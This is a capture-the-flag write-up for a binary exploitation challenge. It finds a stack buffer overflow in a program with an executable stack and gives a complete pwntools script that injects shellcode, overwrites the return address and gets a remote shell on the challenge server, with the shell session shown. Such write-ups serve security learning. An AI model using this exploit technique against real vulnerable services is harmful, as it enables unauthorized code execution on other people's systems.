# Sea Shells

For this challenge we're presented with a binary file and a remote endpoint to connect to.
I made the assumption that what's on the other end of the TCP socket was going to be the provided binary.

Let's see what it does
`objdump -d seashells`

```
00000000004011fe <main>:
  4011fe:	55                   	push   %rbp
  4011ff:	48 89 e5             	mov    %rsp,%rbp
  401202:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401206:	b8 00 00 00 00       	mov    $0x0,%eax
  40120b:	e8 a0 ff ff ff       	callq  4011b0 <setup>
  401210:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  401214:	48 89 c6             	mov    %rax,%rsi
  401217:	48 8d 3d fe 0d 00 00 	lea    0xdfe(%rip),%rdi        # 40201c <_IO_stdin_used+0x1c>
  40121e:	b8 00 00 00 00       	mov    $0x0,%eax
  401223:	e8 38 fe ff ff       	callq  401060 <printf@plt>
  401228:	48 8d 3d f1 0d 00 00 	lea    0xdf1(%rip),%rdi        # 402020 <_IO_stdin_used+0x20>
  40122f:	b8 00 00 00 00       	mov    $0x0,%eax
  401234:	e8 27 fe ff ff       	callq  401060 <printf@plt>
  401239:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  40123d:	ba 90 00 00 00       	mov    $0x90,%edx
  401242:	48 89 c6             	mov    %rax,%rsi
  401245:	bf 00 00 00 00       	mov    $0x0,%edi
  40124a:	e8 31 fe ff ff       	callq  401080 <read@plt>
  40124f:	48 8d 3d 01 0e 00 00 	lea    0xe01(%rip),%rdi        # 402057 <_IO_stdin_used+0x57>
  401256:	e8 e5 fd ff ff       	callq  401040 <puts@plt>
  40125b:	b8 00 00 00 00       	mov    $0x0,%eax
  401260:	c9                   	leaveq 
  401261:	c3                   	retq   
  401262:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  401269:	00 00 00 
  40126c:	0f 1f 40 00          	nopl   0x0(%rax)

```

Looks like it does nothing other than print out a couple of lines, accept some input and then print another line. 

We can see from the above that the call to read on stdin is reads 0x90 bytes in to a buffer that's only 0x80 bytes long. 

That should give us just enough space to overflow the buffer over the return pointer of main. 

Let's have a look at checksec 

```
checksec --file=seashells
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   77) Symbols	  No	0		2		seashells

``` 

Good news it looks like the stack is executable, ok we should be able to read the address that is echo's out at the start. That should point to the start of our input. 

We just need to make main return in to our input.

```
from pwn import *
context.arch="amd64"
#sh = process("./seashells")
sh = remote("challenge.ctf.games", 30398)
addr = int(sh.recvline(), 16)
print(hex(addr))
print(sh.recvuntil(":"))
sh.sendline(fit({0: asm(shellcraft.amd64.linux.sh()), 0x88: addr}))
sh.interactive()

```


```
python3 exploit.py 
[+] Opening connection to challenge.ctf.games on port 30398: Done
0x7ffcf3a6a8b0
b'How many sea shells did Sally sell by the sea shore?:'
[*] Switching to interactive mode
 Nope
$ ls
flag.txt
seashells
$ cat flag.txt
flag{popping_shells_by_the_sea_shore}

```


Worked a treat
